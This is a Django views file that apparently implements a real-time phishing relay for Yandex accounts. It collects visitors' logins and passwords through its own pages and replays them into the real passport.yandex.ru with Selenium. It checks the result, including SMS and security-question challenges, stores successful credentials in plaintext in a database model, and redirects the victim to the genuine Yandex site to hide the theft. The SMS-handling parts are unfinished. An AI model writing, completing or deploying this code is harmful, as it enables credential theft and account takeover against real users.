import asyncio
import logging

from django.shortcuts import render,redirect
from django.contrib import messages
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from asgiref.sync import sync_to_async
from .models import CustomUser
from selenium.common.exceptions import TimeoutException
from django.http import HttpResponse
selenium_drivers = {}



async def index(request):
    client_ip = request.META.get('REMOTE_ADDR')
    driver = await get_driver(request, client_ip)

    if request.method == 'POST':
        if driver is not None and driver.current_window_handle:
            login = request.POST.get('login')
            password = request.POST.get('passwd')
            phone = request.POST.get('phone')

            if password:
                result = await asyncio.to_thread(sign_in, driver, login, password)
                if result == "success":
                    custom_user = CustomUser(login=login, password=password)
                    await sync_to_async(custom_user.save)()
                    return await sync_to_async(redirect)('https://id.yandex.ru/')

                elif result == "sms_code":
                    return HttpResponse('sms_code')
                    # phone_secure = WebDriverWait(driver, 10).until(
                    #     EC.presence_of_element_located((By.TAG_NAME, "strong"))
                    # )
                    # phone_submit = driver.find_element(By.TAG_NAME, "button")
                    # phone_submit.click()
                    # return await sync_to_async(render)(request, 'secure_login.html',
                    #                                    {'phone_number': phone_secure.text})


                elif result == "security_question":
                    # Handle security question
                    return HttpResponse('security question')

                elif result == "incorrect_password":
                    return await sync_to_async(render)(request, 'index.html', {'incorrect_password': True})

                else:
                    messages.error(request, 'Unknown error occurred')
                    return await sync_to_async(render)(request, 'index.html')

            elif login:
                await asyncio.to_thread(open_yandex_passport, driver)
                username_login = WebDriverWait(driver, 10).until(
                    EC.presence_of_element_located((By.NAME, 'login'))
                )
                login_submit = driver.find_element(By.ID, "passp:sign-in")
                username_login.send_keys(login)
                login_submit.click()

                return await sync_to_async(render)(request, 'welcome.html',
                                                   {'login_name': username_login.get_attribute('value')})
            elif phone:
                pass
            else:
                messages.error(request, 'Please enter login or phone')
                return await sync_to_async(render)(request, 'index.html')

    return await sync_to_async(render)(request, 'index.html')


def create_selenium_driver():
    chrome_options = Options()
    chrome_options.add_experimental_option("detach", True)
    driver = webdriver.Chrome(chrome_options=chrome_options)

    return driver

def open_yandex_passport(driver):
    driver.get("https://passport.yandex.ru")

def sign_in(driver, login, password):
    open_yandex_passport(driver)
    username_login = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.NAME, 'login'))
    )
    login_submit = driver.find_element(By.ID, "passp:sign-in")
    username_login.send_keys(login)
    login_submit.click()

    username_password = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.NAME, 'passwd')))
    password_submit = driver.find_element(By.ID, "passp:sign-in")
    username_password.send_keys(password)
    password_submit.click()

    try:
        # 1. Successful authorization
        WebDriverWait(driver, 2).until(
            EC.presence_of_element_located((By.CLASS_NAME, "UserID-Avatar"))
        )
        return "success"

    except TimeoutException:
        try:
            # 2. SMS code required
            WebDriverWait(driver, 2).until(
                EC.presence_of_element_located((By.CLASS_NAME, "auth-challenge-form-hint"))
            )
            return "sms_code"

        except TimeoutException:
            try:
                # 3. Security question
                WebDriverWait(driver, 2).until(
                    EC.presence_of_element_located((By.ID, "passp-field-question"))
                )
                return "security_question"

            except TimeoutException:
                try:

                    # 4. Incorrect password
                    WebDriverWait(driver, 2).until(
                        EC.presence_of_element_located((By.ID, "field:input-passwd:hint"))
                    )

                    return "incorrect_password"

                except TimeoutException:
                    logging.warning(f"wtf")
                    return "unknown_error"

async def get_driver(request, client_ip):
    if client_ip not in selenium_drivers:
        selenium_drivers[client_ip] = await asyncio.to_thread(create_selenium_driver)
    else:
        driver = selenium_drivers[client_ip]
        if not driver.current_window_handle:
            driver.quit()
            selenium_drivers[client_ip] = await asyncio.to_thread(create_selenium_driver)
    return selenium_drivers[client_ip]


async def handle_sms_verification(request):
    client_ip = request.META.get('REMOTE_ADDR')
    driver = await get_driver(request, client_ip)
    if request.method == 'POST':
        logging.warning(f'HOREEEY')
    return await sync_to_async(render)(request, 'verification.html')
